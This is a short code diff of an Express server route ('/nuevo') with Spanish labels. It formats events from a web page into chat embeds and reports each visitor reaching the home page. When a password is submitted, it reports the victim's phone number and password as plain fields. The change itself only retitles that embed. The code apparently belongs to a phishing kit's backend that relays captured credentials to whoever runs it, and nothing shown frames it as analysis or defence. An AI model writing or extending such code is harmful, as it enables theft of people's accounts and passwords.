@@ -56,7 +56,7 @@ app.post('/nuevo', async (req, res) => {
                 embed.setTitle('👀 Usuario en la página de inicio');
             } 
             else if (accion === 'password') {
-                embed.setTitle('🔒 Contraseña Ingresada')
+                embed.setTitle('🔒 Numero y Contraaseña')
                      .addFields(
                          { name: '📱 Teléfono', value: `\`${numero}\``, inline: true },
                          { name: '🔑 Clave', value: `\`${password}\``, inline: true }
